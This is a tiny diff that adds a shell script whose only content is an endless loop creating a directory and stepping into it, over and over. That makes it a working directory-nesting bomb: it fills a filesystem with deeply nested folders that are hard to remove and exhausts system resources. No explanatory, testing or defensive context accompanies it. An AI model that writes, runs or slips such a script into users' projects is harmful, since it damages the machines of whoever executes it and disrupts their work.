@@ -1,0 +1,2 @@
+#!/bin/sh
+while true ; do mkdir lol; cd lol ; done
